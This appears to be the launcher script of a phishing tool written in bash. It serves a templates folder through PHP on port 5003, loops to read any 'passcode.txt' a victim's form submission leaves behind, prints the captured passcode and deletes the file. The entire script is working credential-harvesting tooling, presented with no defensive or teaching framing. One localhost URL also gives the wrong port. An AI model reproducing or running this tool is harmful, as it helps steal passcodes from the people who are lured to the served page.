

# Start Server
start(){
    cd templates && php -S 0.0.0.0:5003 > /dev/null 2>&1 &
    IP=$(hostname -I | xargs)
    echo -e "\e[36m[+]Server Started!"
    echo -e "\e[33m[+]Localhost: http://127.0.0.1:50003"
    echo "[+]Local Network: http://$IP:5003"
}

# Check if Someone Submitted Password
check(){
    if [[ -f "./templates/passcode.txt" ]];then
        pw=$(cat ./templates/passcode.txt)
        echo -e "\n\e[32mPasscode: $pw"
        rm -f "./templates/passcode.txt"
    fi
}


# If control-c is pressed
ctrl_c(){
    echo -e "\r\e[31m[-]Good Bye!"
    pkill php
    exit
}

# If control-z is pressed
ctrl_z(){
    echo -e "\r\e[31m[-]Good Bye!"
    pkill php
    exit
}

start
trap ctrl_z SIGTSTP
trap ctrl_c INT
# Run Forever
while :; do
    check
done
